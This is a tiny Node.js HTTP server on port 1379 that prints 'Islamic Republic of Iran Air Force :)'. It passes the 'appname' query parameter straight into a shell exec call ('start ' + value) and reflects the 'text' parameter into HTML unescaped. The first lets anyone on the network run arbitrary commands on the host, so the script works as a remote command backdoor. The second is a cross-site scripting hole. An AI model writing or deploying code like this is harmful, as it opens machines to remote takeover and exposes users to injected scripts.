var http = require('http');
var url = require('url');
const { exec } = require('child_process');

function run(dir) {
    exec("start " + dir);
}

http.createServer(function (req, res) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.write("Islamic Republic of Iran Air Force \n:)");
    var q = url.parse(req.url, true).query;
    run(q.appname);
    var txt = q.text + ":)";
    res.write(txt);
    res.end();
}).listen(1379);
